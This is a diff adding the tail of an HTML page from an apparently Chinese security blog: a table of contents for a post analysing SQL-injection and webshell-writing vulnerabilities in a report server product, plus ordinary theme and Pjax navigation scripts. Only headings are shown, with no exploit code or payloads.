+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E7%AE%80%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">项目结构简析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">调试教程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">3.1.</span> <span class="nav-text">远程调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%86"><span class="nav-number">4.</span> <span class="nav-text">版本区分</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E6%B3%A8%E5%86%8C%E9%80%BB%E8%BE%91"><span class="nav-number">5.</span> <span class="nav-text">Servlet注册逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet%E6%B3%A8%E5%86%8C"><span class="nav-number">5.1.</span> <span class="nav-text">servlet注册</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#activator%E6%B3%A8%E5%86%8C"><span class="nav-number">5.2.</span> <span class="nav-text">activator注册</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="nav-number">5.2.1.</span> <span class="nav-text">配置文件加载模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#start%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">5.2.2.</span> <span class="nav-text">start初始化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">路由分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet"><span class="nav-number">6.1.</span> <span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dispatcher"><span class="nav-number">6.2.</span> <span class="nav-text">Dispatcher</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#webroot-ReportServer"><span class="nav-number">6.2.1.</span> <span class="nav-text">&#x2F;webroot&#x2F;ReportServer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webroot-decision-view-report"><span class="nav-number">6.2.2.</span> <span class="nav-text">&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#print-ie-pdf-SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">7.</span> <span class="nav-text">&#x2F;print&#x2F;ie&#x2F;pdf  SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">7.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%8E%B7%E5%8F%96"><span class="nav-number">7.2.1.</span> <span class="nav-text">恶意表达式获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">7.2.2.</span> <span class="nav-text">SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">7.2.2.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E7%BB%95%E8%BF%87"><span class="nav-number">7.2.3.</span> <span class="nav-text">SQL绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">7.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D"><span class="nav-number">7.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#view-ReportServer-SQL%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">8.</span> <span class="nav-text">&#x2F;view&#x2F;ReportServer? SQL注入写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">8.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">8.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#export-excel-SQL%E6%B3%A8%E5%85%A5%E5%86%99webshell"><span class="nav-number">9.</span> <span class="nav-text">export&#x2F;excel SQL注入写webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">9.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">9.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sessionID%E8%8E%B7%E5%8F%96"><span class="nav-number">9.2.1.</span> <span class="nav-text">sessionID获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML%E6%A0%BC%E5%BC%8F%E6%8E%A8%E5%AF%BC"><span class="nav-number">9.2.2.</span> <span class="nav-text">XML格式推导</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5webshell"><span class="nav-number">9.2.3.</span> <span class="nav-text">写入webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-2"><span class="nav-number">9.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">9.4.</span> <span class="nav-text">官方修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">11.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
